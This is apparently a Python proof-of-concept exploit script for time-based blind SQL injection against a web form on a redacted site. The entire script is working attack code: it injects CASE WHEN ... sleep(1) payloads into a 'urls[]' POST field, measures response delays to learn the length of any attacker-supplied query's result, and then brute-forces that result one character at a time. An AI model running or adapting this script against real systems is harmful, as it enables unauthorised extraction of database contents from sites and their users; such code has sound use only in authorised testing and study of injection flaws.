#!/usr/bin/python
# -*- coding: utf-8 -*-
import requests
import sys
import time

# xxxxxxxxxexample.com SQLi POC
# Coded by Ahmed Sultan (0x4148)

if len(sys.argv) == 1:
    print '''
Usage : python sql.py "QUERY"
Example : python sql.py "(select database)"
 '''
    sys.exit()
query = sys.argv[1]
print '[*] Obtaining length'
url = 'https://xxxxxxxxxexample.com:443/sub'
headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Cookie': 'xxxxxxxxxxxxxxxxxxx',
    'Referer': 'https://www.xxxxxxxxxexample.com:443/',
    'Host': 'www.xxxxxxxxxexample.com',
    'Connection': 'close',
    'X-Requested-With': 'XMLHttpRequest',
    'Content-Type': 'application/x-www-form-urlencoded',
    }
for i in range(1, 100):
    current_time = time.time()
    data = {'methods[]': 'on-site',
            'urls[]': "jnkfooo'-cast((select CASE WHEN ((select length(" \
            + query + '))=' + str(i) \
            + ") THEN (sleep(1)) ELSE 2 END) as char)-'"}
    response = requests.post(url, headers=headers, data=data).text
    response_time = time.time()
    time_taken = response_time - current_time
    print "Executing jnkfooo'-cast((select CASE WHEN ((select length(" \
        + query + '))=' + str(i) \
        + ") THEN (sleep(1)) ELSE 2 END) as char)-'" + ' took ' \
        + str(time_taken)
    if time_taken > 2:
        print '[+] Length of DB query output is : ' + str(i)
        length = i + 1
        break
    i = i + 1
print '[*] obtaining query output\n'
outp = ''

# Obtaining query output

charset = \
    'abcdefghijklmnopqrstuvwxyz0123456789.ABCDEFGHIJKLMNOPQRSTUVWXYZ_@-.'
for i in range(1, length):
    for char in charset:
        current_time = time.time()
        data = {'methods[]': 'on-site',
                'urls[]': "jnkfooo'-cast((select CASE WHEN (" + query \
                + " like '" + outp + char \
                + "%') THEN (sleep(1)) ELSE 2 END) as char)-'"}
        response = requests.post(url, headers=headers, data=data).text
        response_time = time.time()
        time_taken = response_time - current_time
        print "Executing jnkfooo'-cast((select CASE WHEN (" + query \
            + " like '" + outp + char \
            + "%') THEN (sleep(1)) ELSE 2 END) as char)-' took " \
            + str(time_taken)
        if time_taken > 2:
            print "Got '" + char + "'"
            outp = outp + char
            break
    i = i + 1
print 'QUERY output : ' + outp

			
